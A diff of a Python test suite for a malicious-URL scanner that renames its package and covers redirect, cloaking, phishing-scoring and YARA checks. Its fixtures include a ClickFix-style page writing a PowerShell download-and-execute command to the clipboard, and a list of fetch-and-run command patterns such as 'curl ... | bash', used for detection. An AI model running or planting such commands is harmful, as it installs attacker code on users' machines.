@@ -11,9 +11,9 @@ from _support import _rules_dir, requires_browser, requires_yara, yara_rules_dir
 @requires_browser
 @pytest.mark.asyncio
 async def test_benign_scan():
-    from pnakotic.src.scanner.engine import PnakoticEngine
+    from mandacaru.src.scanner.engine import MandacaruEngine
 
-    engine = PnakoticEngine(task_id="test-job")
+    engine = MandacaruEngine(task_id="test-job")
     result = await engine.scan("https://www.google.com")
     assert result.target_url == "https://www.google.com"
     # google.com's inline scripts may trip the js_location heuristic (0.4); a direct,
@@ -25,9 +25,9 @@ async def test_benign_scan():
 @requires_browser
 @pytest.mark.asyncio
 async def test_redirect_detection():
-    from pnakotic.src.scanner.engine import PnakoticEngine
+    from mandacaru.src.scanner.engine import MandacaruEngine
 
-    engine = PnakoticEngine(task_id="test-job")
+    engine = MandacaruEngine(task_id="test-job")
     # http://google.com redirects to https://www.google.com/
     result = await engine.scan("http://google.com")
     assert result.is_redirect_chain_detected is True
@@ -35,7 +35,7 @@ async def test_redirect_detection():
 
 
 def test_artifact_safety(tmp_path):
-    from pnakotic.src.scanner.artifacts import ArtifactManager
+    from mandacaru.src.scanner.artifacts import ArtifactManager
 
     am = ArtifactManager(base_dir=str(tmp_path / "vault"))
     with pytest.raises(ValueError):
@@ -45,7 +45,7 @@ def test_artifact_safety(tmp_path):
 
 
 def test_artifact_manifest_recurses(tmp_path):
-    from pnakotic.src.scanner.artifacts import ArtifactManager
+    from mandacaru.src.scanner.artifacts import ArtifactManager
 
     am = ArtifactManager(base_dir=str(tmp_path / "vault"))
     folder = am.create_task_folder("job-1")
@@ -58,55 +58,55 @@ def test_artifact_manifest_recurses(tmp_path):
 
 
 def test_scoring_ip_landing():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     result = ScanResult(target_url="http://1.2.3.4/", final_url="http://1.2.3.4/")
     result.hops = [RedirectHop(url="http://1.2.3.4/", status_code=302, mechanism="http_3xx")]
-    score = PnakoticScorer().score(result)
+    score = MandacaruScorer().score(result)
     assert score >= 0.5  # ip_landing weight
 
 
 def test_scoring_meta_refresh_and_high_value():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     result = ScanResult(target_url="http://junk.tk/", final_url="https://www.google.com/")
     result.hops = [RedirectHop(url="http://junk.tk/", mechanism="meta_refresh")]
-    score = PnakoticScorer().score(result)
+    score = MandacaruScorer().score(result)
     # meta_refresh (0.25) + high_value_landing after a redirect (0.2); final TLD is .com
     assert abs(score - 0.45) < 1e-9
 
 
 def test_scoring_suspicious_tld():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     result = ScanResult(target_url="http://x.tk/", final_url="http://x.tk/")
-    assert PnakoticScorer().score(result) == pytest.approx(0.3)
+    assert MandacaruScorer().score(result) == pytest.approx(0.3)
 
 
 def _scored(target, final, hops=(), signals=None, **metadata):
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     result = ScanResult(target_url=target, final_url=final)
     result.hops = [RedirectHop(url=target, status_code=301, mechanism=m) for m in hops]
     if signals is not None:
         result.metadata["page_signals"] = signals
     result.metadata.update(metadata)
-    return PnakoticScorer().score(result), result.metadata["scoring_findings"]
+    return MandacaruScorer().score(result), result.metadata["scoring_findings"]
 
 
 _NO_SIGNALS = {"title": "", "password_inputs": 0, "forms": 0, "content_type": "text/html", "error_page": False}
 
 
 def _scored_site(target, final, mechanisms, site_host):
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
     result = ScanResult(target_url=target, final_url=final)
     result.hops = [RedirectHop(url=target, mechanism=m) for m in mechanisms]
-    return PnakoticScorer().score(result, site_host=site_host), result.metadata["scoring_findings"]
+    return MandacaruScorer().score(result, site_host=site_host), result.metadata["scoring_findings"]
 
 
 def test_site_mode_drops_identity_signals_on_site():
@@ -254,41 +254,41 @@ def test_scoring_credential_form_needs_a_brand():
 
 def _nav_hop(mechanism, url, to):
     import json
-    from pnakotic.src.scanner.models import RedirectHop
+    from mandacaru.src.scanner.models import RedirectHop
 
     return RedirectHop(url=url, mechanism=mechanism, evidence=json.dumps({"id": mechanism, "to": to}))
 
 
 def test_scoring_same_site_js_navigation_is_unweighted():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     url = "https://www.amazon.com/"
     result = ScanResult(target_url=url, final_url=url)
     result.hops = [_nav_hop("js_location", url, url), RedirectHop(url=url, mechanism="js_obfuscation")]
     # Amazon-style: a script reloading its own page plus String.fromCharCode in the bundle.
-    assert PnakoticScorer().score(result) == pytest.approx(0.1)
+    assert MandacaruScorer().score(result) == pytest.approx(0.1)
     findings = result.metadata["scoring_findings"]
     assert "JS navigation within the same site: www.amazon.com" in findings
     assert "JS obfuscation helpers present (no cross-site redirect)" in findings
 
     # Same page, but the script sends the visitor to another registrable domain.
     result.hops[0] = _nav_hop("js_location", url, "https://other.example/")
-    assert PnakoticScorer().score(result) == pytest.approx(0.4 + 0.4)  # js_location + js_obfuscated
+    assert MandacaruScorer().score(result) == pytest.approx(0.4 + 0.4)  # js_location + js_obfuscated
     assert "JS location manipulation" in result.metadata["scoring_findings"]
 
     # Unknown destination: old behaviour (counts as crossing).
     result.hops[0] = RedirectHop(url=url, mechanism="js_location")
-    assert PnakoticScorer().score(result) == pytest.approx(0.8)
+    assert MandacaruScorer().score(result) == pytest.approx(0.8)
 
 
 def test_scoring_same_site_meta_refresh_is_unweighted():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     result = ScanResult(target_url="https://shop.example.com/", final_url="https://shop.example.com/")
     result.hops = [_nav_hop("meta_refresh", "https://shop.example.com/", "https://www.example.com/next")]
-    assert PnakoticScorer().score(result) == 0.0
+    assert MandacaruScorer().score(result) == 0.0
     assert "Meta refresh within the same site: shop.example.com" in result.metadata["scoring_findings"]
 
 
@@ -326,7 +326,7 @@ def test_scoring_short_brand_tokens_match_whole_labels_only():
 
 
 def test_static_analyzer_b64_filter():
-    from pnakotic.src.scanner.static_analyzer import StaticAnalyst
+    from mandacaru.src.scanner.static_analyzer import StaticAnalyst
 
     analyst = StaticAnalyst()
     # 64-char hex hash: long alnum run, no +/= -> filtered out (no findings)
@@ -340,7 +340,7 @@ def test_static_analyzer_b64_filter():
 
 
 def test_static_analyzer_meta_refresh_order_independent():
-    from pnakotic.src.scanner.static_analyzer import StaticAnalyst
+    from mandacaru.src.scanner.static_analyzer import StaticAnalyst
 
     analyst = StaticAnalyst()
     content_first = '<meta content="0; url=https://x.example" http-equiv="refresh">'
@@ -350,7 +350,7 @@ def test_static_analyzer_meta_refresh_order_independent():
 
 
 def test_static_analyzer_js_location_variants():
-    from pnakotic.src.scanner.static_analyzer import StaticAnalyst
+    from mandacaru.src.scanner.static_analyzer import StaticAnalyst
 
     analyst = StaticAnalyst()
     for html in (
@@ -365,7 +365,7 @@ def test_static_analyzer_js_location_variants():
 
 def test_hop_and_result_timestamps_are_per_instance():
     import time
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     a = RedirectHop(url="http://a.example/", mechanism="http_3xx")
     r1 = ScanResult(target_url="http://a.example/")
@@ -377,8 +377,8 @@ def test_hop_and_result_timestamps_are_per_instance():
 
 
 def test_obfuscation_signatures_are_not_redirects():
-    from pnakotic.src.scanner.models import REDIRECT_MECHANISMS
-    from pnakotic.src.scanner.static_analyzer import SIGNATURE_MECHANISMS
+    from mandacaru.src.scanner.models import REDIRECT_MECHANISMS
+    from mandacaru.src.scanner.static_analyzer import SIGNATURE_MECHANISMS
 
     for sig in ("js_atob", "js_fromCharCode"):
         assert SIGNATURE_MECHANISMS[sig] not in REDIRECT_MECHANISMS
@@ -390,8 +390,8 @@ def test_obfuscation_signatures_are_not_redirects():
 
 
 def test_scoring_obfuscation_counted_once():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     result.hops = [
@@ -399,33 +399,33 @@ def test_scoring_obfuscation_counted_once():
         RedirectHop(url="https://x.example/", mechanism="js_obfuscation"),  # fromCharCode
     ]
     # Obfuscation helpers alone (no cross-site redirect, no brand) are the weak tier: once.
-    assert PnakoticScorer().score(result) == pytest.approx(0.1)
+    assert MandacaruScorer().score(result) == pytest.approx(0.1)
     assert "JS obfuscation helpers present (no cross-site redirect)" in result.metadata["scoring_findings"]
 
     # Next to a cross-site observed redirect they are the full 0.4, still counted once.
     result.hops.append(RedirectHop(url="https://x.example/", status_code=302, mechanism="http_3xx",
                                    headers={"location": "https://y.example/"}))
-    assert PnakoticScorer().score(result) == pytest.approx(0.4)
+    assert MandacaruScorer().score(result) == pytest.approx(0.4)
     assert "JS obfuscation helpers (atob / String.fromCharCode)" in result.metadata["scoring_findings"]
 
 
 def test_scoring_deep_chain_ignores_static_hops():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     passive = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     passive.hops = [RedirectHop(url="https://x.example/", mechanism="static_analysis") for _ in range(6)]
-    assert PnakoticScorer().score(passive) == 0.0
+    assert MandacaruScorer().score(passive) == 0.0
 
     # Same apex before and after, so cross_domain_redirect stays out of this deep_chain-only case.
     deep = ScanResult(target_url="https://x.example/", final_url="https://www.x.example/")
     deep.hops = [RedirectHop(url=f"https://h{i}.example/", status_code=302, mechanism="http_3xx") for i in range(6)]
-    assert PnakoticScorer().score(deep) == pytest.approx(0.2)
+    assert MandacaruScorer().score(deep) == pytest.approx(0.2)
 
 
 def test_scoring_redirect_code_present_counted_once():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     result.hops = [
@@ -435,14 +435,14 @@ def test_scoring_redirect_code_present_counted_once():
         RedirectHop(url="https://x.example/", mechanism="js_location_code"),
         RedirectHop(url="https://x.example/", mechanism="js_location_code"),
     ]
-    assert PnakoticScorer().score(result) == pytest.approx(0.25)  # 0.1 + 0.15, once each
+    assert MandacaruScorer().score(result) == pytest.approx(0.25)  # 0.1 + 0.15, once each
     findings = result.metadata["scoring_findings"]
     assert findings.count("Meta refresh code present (did not fire)") == 1
     assert findings.count("JS location code present (did not fire)") == 1
 
 
 def test_launch_options_channel(monkeypatch):
-    from pnakotic.src.scanner.engine import launch_options
+    from mandacaru.src.scanner.engine import launch_options
 
     monkeypatch.delenv("BROWSER_CHANNEL", raising=False)
     opts = launch_options(4321)
@@ -507,7 +507,7 @@ def local_site():
                 self.send_response(200)
                 self.send_header("Content-Type", "text/javascript")
                 self.end_headers()
-                self.wfile.write(b"var PNAKOTIC_TEST_SKIMMER = 1;")
+                self.wfile.write(b"var MANDACARU_TEST_SKIMMER = 1;")
                 return
             if self.path == "/sw.js":
                 self.send_response(200)
@@ -566,7 +566,7 @@ def local_site():
             elif self.path == "/with-frame":
                 self.wfile.write(b"<html><body>news<iframe src='/ad-frame'></iframe></body></html>")
             elif self.path == "/ad-frame":
-                self.wfile.write(b"<html><body><script>var PNAKOTIC_TEST_ADFRAME = 1;</script></body></html>")
+                self.wfile.write(b"<html><body><script>var MANDACARU_TEST_ADFRAME = 1;</script></body></html>")
             elif self.path == "/clickfix":  # writes on load; real ClickFix waits for a click
                 self.wfile.write(b"<html><body>Verify you are human<script>"
                                  b"navigator.clipboard.writeText('powershell -w h -c \"iwr x.example|iex\"').catch(function(){});"
@@ -608,13 +608,13 @@ def local_site():
 def _local_engine(tmp_path):
     """Engine whose egress policy allows only the literal 127.0.0.1 (so `localhost`,
     the same address under another name, stands in for an internal host)."""
-    from pnakotic.src.scanner.artifacts import ArtifactManager
-    from pnakotic.src.scanner.engine import PnakoticEngine
+    from mandacaru.src.scanner.artifacts import ArtifactManager
+    from mandacaru.src.scanner.engine import MandacaruEngine
 
     async def only_loopback_literal(host):
         return host == "127.0.0.1"
 
-    engine = PnakoticEngine(task_id="local-job", timeout_ms=10000, host_allowed=only_loopback_literal)
+    engine = MandacaruEngine(task_id="local-job", timeout_ms=10000, host_allowed=only_loopback_literal)
     engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
     return engine
 
@@ -665,12 +665,12 @@ async def test_redirect_to_internal_host_is_blocked(local_site, tmp_path):
 @requires_browser
 @pytest.mark.asyncio
 async def test_internal_target_is_blocked_by_default_policy(local_site, tmp_path):
-    from pnakotic.src.scanner.artifacts import ArtifactManager
-    from pnakotic.src.scanner.engine import PnakoticEngine
+    from mandacaru.src.scanner.artifacts import ArtifactManager
+    from mandacaru.src.scanner.engine import MandacaruEngine
 
     base, hits = local_site
     hits.clear()
-    engine = PnakoticEngine(task_id="local-job", timeout_ms=10000)  # real policy
+    engine = MandacaruEngine(task_id="local-job", timeout_ms=10000)  # real policy
     engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
     result = await engine.scan(f"{base}/target")
     assert hits == []
@@ -707,7 +707,7 @@ async def test_allowed_websocket_passes_through_proxy(local_site, tmp_path):
 async def test_egress_proxy_socks5(local_site):
     import struct
     from urllib.parse import urlparse
-    from pnakotic.src.scanner.egress_proxy import EgressProxy
+    from mandacaru.src.scanner.egress_proxy import EgressProxy
 
     async def only_loopback_literal(host):
         return host == "127.0.0.1"
@@ -741,7 +741,7 @@ async def test_egress_proxy_socks5(local_site):
 
 
 def _redirect_hops(result):
-    from pnakotic.src.scanner.models import REDIRECT_MECHANISMS
+    from mandacaru.src.scanner.models import REDIRECT_MECHANISMS
 
     return [h for h in result.hops if h.mechanism in REDIRECT_MECHANISMS]
 
@@ -800,14 +800,14 @@ async def test_delayed_redirect_code_is_not_a_redirect(local_site, tmp_path):
 @pytest.mark.asyncio
 async def test_js_redirect_loop_stops_at_max_hops(local_site, tmp_path):
     import time
-    from pnakotic.src.scanner.artifacts import ArtifactManager
-    from pnakotic.src.scanner.engine import PnakoticEngine
+    from mandacaru.src.scanner.artifacts import ArtifactManager
+    from mandacaru.src.scanner.engine import MandacaruEngine
 
     async def only_loopback_literal(host):
         return host == "127.0.0.1"
 
     base, _hits = local_site
-    engine = PnakoticEngine(task_id="local-job", timeout_ms=10000, max_hops=4,
+    engine = MandacaruEngine(task_id="local-job", timeout_ms=10000, max_hops=4,
                             host_allowed=only_loopback_literal)
     engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
     started = time.monotonic()
@@ -821,14 +821,14 @@ async def test_js_redirect_loop_stops_at_max_hops(local_site, tmp_path):
 @requires_browser
 @pytest.mark.asyncio
 async def test_slow_subresource_does_not_skip_analysis(local_site, tmp_path):
-    from pnakotic.src.scanner.artifacts import ArtifactManager
-    from pnakotic.src.scanner.engine import PnakoticEngine
+    from mandacaru.src.scanner.artifacts import ArtifactManager
+    from mandacaru.src.scanner.engine import MandacaruEngine
 
     async def only_loopback_literal(host):
         return host == "127.0.0.1"
 
     base, _hits = local_site
-    engine = PnakoticEngine(task_id="local-job", timeout_ms=3000, host_allowed=only_loopback_literal)
+    engine = MandacaruEngine(task_id="local-job", timeout_ms=3000, host_allowed=only_loopback_literal)
     engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
     result = await engine.scan(f"{base}/never-idle")  # the <img> holds `load` open past the timeout
     assert result.metadata.get("raw_error") or result.metadata.get("settle_timed_out")
@@ -853,7 +853,7 @@ async def test_analyzer_exception_propagates(local_site, tmp_path):
 # ---------- landing-page behavior (behavior.py) ----------
 
 def _behaviors(result):
-    from pnakotic.src.scanner.behavior import behavior_events
+    from mandacaru.src.scanner.behavior import behavior_events
     return behavior_events(result.hops)
 
 
@@ -961,7 +961,7 @@ async def test_plain_page_has_no_behaviors(local_site, tmp_path):
 @pytest.mark.asyncio
 async def test_hooks_are_not_visible_to_the_page(local_site):
     from playwright.async_api import async_playwright
-    from pnakotic.src.scanner.behavior import BehaviorRecorder
+    from mandacaru.src.scanner.behavior import BehaviorRecorder
 
     base, _ = local_site
     async with async_playwright() as p:
@@ -979,7 +979,7 @@ async def test_hooks_are_not_visible_to_the_page(local_site):
 
 
 def test_behavior_recorder_bounds_page_input():
-    from pnakotic.src.scanner.behavior import MAX_EVENTS, MAX_PER_ID, MAX_TEXT, BehaviorRecorder
+    from mandacaru.src.scanner.behavior import MAX_EVENTS, MAX_PER_ID, MAX_TEXT, BehaviorRecorder
 
     rec = BehaviorRecorder()
     rec._on_page_event({}, {"id": "not_a_behavior"})
@@ -996,7 +996,7 @@ def test_behavior_recorder_bounds_page_input():
 
 
 def test_clipboard_command_patterns():
-    from pnakotic.src.scanner.behavior import is_command, is_executable
+    from mandacaru.src.scanner.behavior import is_command, is_executable
 
     for text in ("powershell -w h -c iex(iwr x)", "cmd /c start x", "mshta https://x/y",
                  "curl -s https://x/i | bash", "echo aGk= | base64 -d | sh", "conhost --headless pwsh"):
@@ -1009,13 +1009,13 @@ def test_clipboard_command_patterns():
 
 def _behavior_hop(**event):
     import json
-    from pnakotic.src.scanner.models import RedirectHop
+    from mandacaru.src.scanner.models import RedirectHop
     return RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence=json.dumps(event))
 
 
 def test_scoring_behavior_support_weights():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     result.hops = [
@@ -1024,43 +1024,43 @@ def test_scoring_behavior_support_weights():
         _behavior_hop(id="notification_request"),
         _behavior_hop(id="fullscreen_request"),  # one lock behavior: supporting, not decisive
     ]
-    score = PnakoticScorer().score(result)
+    score = MandacaruScorer().score(result)
     assert score == pytest.approx(0.15 + 0.2 + 0.15)
     assert result.metadata["decisive_findings"] == []
 
 
 def test_scoring_lone_beforeunload_is_not_weighted():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     result.hops = [_behavior_hop(id="beforeunload_trap", via="addEventListener")]
-    assert PnakoticScorer().score(result) == 0.0 and result.metadata["scoring_findings"] == []
+    assert MandacaruScorer().score(result) == 0.0 and result.metadata["scoring_findings"] == []
     result.hops.append(_behavior_hop(id="history_flood", calls=10))  # with a second lock behavior: decisive
-    assert PnakoticScorer().score(result) == 1.0
+    assert MandacaruScorer().score(result) == 1.0
 
 
 def test_scoring_decisive_overrides_weights():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     result.hops = [_behavior_hop(id="download", filename="invoice.zip", executable=False)]
-    assert PnakoticScorer().score(result) == pytest.approx(0.4)  # archive: supporting only
+    assert MandacaruScorer().score(result) == pytest.approx(0.4)  # archive: supporting only
 
     result.hops.append(_behavior_hop(id="download", filename="Setup.msi", executable=True))
-    assert PnakoticScorer().score(result) == 1.0
+    assert MandacaruScorer().score(result) == 1.0
     assert result.metadata["scoring_findings"][0].startswith("Decisive: download of Setup.msi")
 
 
 def test_scoring_ignores_malformed_behavior_evidence():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     result.hops = [RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence="not json"),
                    RedirectHop(url="https://x.example/", mechanism="page_behavior", evidence="[1, 2]")]
-    assert PnakoticScorer().score(result) == 0.0
+    assert MandacaruScorer().score(result) == 0.0
 
 
 # ---------- cross-profile comparison (cloaking) ----------
@@ -1084,7 +1084,7 @@ async def test_every_profile_loads_and_cloaking_is_recorded(local_site, tmp_path
     base, _ = local_site
     result = await _two_site_engine(tmp_path).scan(f"{base}/cloak", "default", compare=True)
     cloaking = result.metadata["cloaking"]
-    from pnakotic.src.scanner.profiles import PROFILES
+    from mandacaru.src.scanner.profiles import PROFILES
 
     assert cloaking["landings"] == {name: ("localhost" if name == "mobile-ios" else "127.0.0.1") for name in PROFILES}
     assert cloaking["common"] == "127.0.0.1" and cloaking["steered"] == ["mobile-ios"]
@@ -1110,68 +1110,68 @@ async def test_without_compare_only_the_requested_profile_runs(local_site, tmp_p
 
 
 def _landed(url, **metadata):
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.scanner.models import ScanResult
     r = ScanResult(target_url="https://ads.example/c", final_url=url)
     r.metadata.update(metadata)
     return r
 
 
 def _scored_profiles(*results):
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
     for r in results:
-        PnakoticScorer().score(r)
+        MandacaruScorer().score(r)
     return results
 
 
 def test_cloaking_onto_a_suspicious_page_is_decisive():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
 
     desktop, ios, android = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://win-alert.xyz/"),
                                     _landed("https://www.shop.example/"))
     assert ios.malicious_score == pytest.approx(0.3)  # suspicious TLD only: not suspicious enough alone
     ios.hops = [_behavior_hop(id="notification_request")]
-    PnakoticScorer().score(ios)
+    MandacaruScorer().score(ios)
     assert ios.malicious_score >= 0.4
-    assert PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android}) == 1.0
+    assert MandacaruScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android}) == 1.0
     assert desktop.metadata["cloaking"]["steered"] == ["mobile-ios"]
     assert desktop.metadata["decisive_findings"][0].startswith("Decisive: cloaking")
 
 
 def test_cloaking_with_a_bot_fallback_is_decisive():
     # most profiles get the scam; the bot-like desktop is sent to google.com
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
 
     desktop, ios, android = _scored_profiles(_landed("https://www.google.com/"), _landed("https://10.20.30.40/"),
                                     _landed("https://10.20.30.40/"))
-    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android})
+    MandacaruScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android})
     assert desktop.metadata["cloaking"]["common"] == "10.20.30.40"
     assert desktop.metadata["cloaking"]["suspicious"] == ["mobile-android", "mobile-ios"]
     assert desktop.malicious_score == 1.0
 
 
 def test_harmless_profile_split_is_supporting_only():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
 
     desktop, ios = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://apps.apple.com/app/shop"))
-    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
+    MandacaruScorer().combine(desktop, "default", {"mobile-ios": ios})
     assert desktop.metadata["decisive_findings"] == []
     assert desktop.malicious_score == pytest.approx(0.35)
     assert desktop.metadata["scoring_findings"][0].startswith("Cloaking: landing depends on the browser profile")
 
 
 def test_same_landing_everywhere_is_not_cloaking():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
 
     desktop, ios = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://m.shop.example/"))
-    PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
+    MandacaruScorer().combine(desktop, "default", {"mobile-ios": ios})
     assert desktop.metadata["cloaking"] is None and desktop.malicious_score == 0.0
 
 
 def test_combine_takes_the_worst_profile_and_prefixes_its_findings():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
-    scorer = PnakoticScorer()
+    scorer = MandacaruScorer()
     primary = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     scorer.score(primary)
     ios = ScanResult(target_url="https://x.example/", final_url="https://x.example/a")
@@ -1187,10 +1187,10 @@ def test_combine_takes_the_worst_profile_and_prefixes_its_findings():
 
 
 def test_combine_ignores_profiles_whose_page_never_loaded():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
-    scorer = PnakoticScorer()
+    scorer = MandacaruScorer()
     primary = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
     scorer.score(primary)
     failed = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
@@ -1208,7 +1208,7 @@ def test_combine_ignores_profiles_whose_page_never_loaded():
 
 @requires_yara
 def test_yara_rule_selection_and_broken_files(yara_rules_dir):
-    from pnakotic.src.scanner.yara_scan import _rule_files, load_rules
+    from mandacaru.src.scanner.yara_scan import _rule_files, load_rules
 
     names = sorted(pathlib_name(f) for f in _rule_files(str(yara_rules_dir)))
     assert names == ["html_adframe_test_001.yara", "js_broken_test_001.yara", "js_runtime_test_001.yara",
@@ -1224,7 +1224,7 @@ def pathlib_name(path):
 
 
 def test_yara_is_off_without_rules_dir(monkeypatch, tmp_path):
-    from pnakotic.src.scanner.yara_scan import load_rules
+    from mandacaru.src.scanner.yara_scan import load_rules
 
     monkeypatch.delenv("YARA_RULES_DIR", raising=False)
     assert load_rules() is None
@@ -1235,15 +1235,15 @@ def test_yara_is_off_without_rules_dir(monkeypatch, tmp_path):
 @requires_yara
 @pytest.mark.asyncio
 async def test_yara_bounds_and_dedupes(yara_rules_dir, monkeypatch):
-    from pnakotic.src.scanner import yara_scan
+    from mandacaru.src.scanner import yara_scan
 
     rules = yara_scan.load_rules()
-    marker = b"PNAKOTIC_TEST_SKIMMER"
+    marker = b"MANDACARU_TEST_SKIMMER"
     buffers = [("script", f"http://x.example/{i}.js", marker) for i in range(3)]
     buffers.append(("script", "http://x.example/big.js", b"x" * (yara_scan.MAX_BUFFER_BYTES + 10) + marker))
     found, stats = await yara_scan.scan_buffers(rules, buffers)
     assert len(found) == 1 and found[0]["hits"] == 3  # the marker past the size cap is not seen
-    assert found[0]["url"] == "http://x.example/0.js" and found[0]["snippet"] == "PNAKOTIC_TEST_SKIMMER"
+    assert found[0]["url"] == "http://x.example/0.js" and found[0]["snippet"] == "MANDACARU_TEST_SKIMMER"
     assert stats["buffers"] == 4 and stats["bytes"] <= 3 * len(marker) + yara_scan.MAX_BUFFER_BYTES
     monkeypatch.setattr(yara_scan, "SCAN_BUDGET_S", -1.0)
     _, stats = await yara_scan.scan_buffers(rules, buffers)
@@ -1253,10 +1253,10 @@ async def test_yara_bounds_and_dedupes(yara_rules_dir, monkeypatch):
 @requires_yara
 @pytest.mark.asyncio
 async def test_yara_per_buffer_keeps_each_buffer_with_context(yara_rules_dir):
-    from pnakotic.src.scanner.yara_scan import load_rules, scan_buffers
+    from mandacaru.src.scanner.yara_scan import load_rules, scan_buffers
     rules = load_rules()
-    bufs = [("served", "https://s/", b"<p>PNAKOTIC_TEST_SKIMMER</p>"),
-            ("script", "https://s/a.js", b"x\nPNAKOTIC_TEST_SKIMMER")]
+    bufs = [("served", "https://s/", b"<p>MANDACARU_TEST_SKIMMER</p>"),
+            ("script", "https://s/a.js", b"x\nMANDACARU_TEST_SKIMMER")]
     per, _ = await scan_buffers(rules, bufs, per_buffer=True)
     assert sorted((f["source"], f["buffer_index"]) for f in per) == [("script", 1), ("served", 0)]
     js = next(f for f in per if f["source"] == "script")
@@ -1268,7 +1268,7 @@ async def test_yara_per_buffer_keeps_each_buffer_with_context(yara_rules_dir):
 @requires_yara
 @pytest.mark.asyncio
 async def test_yara_filename_external_gets_an_extension(tmp_path, monkeypatch):
-    from pnakotic.src.scanner import yara_scan
+    from mandacaru.src.scanner import yara_scan
 
     (tmp_path / "r").mkdir()
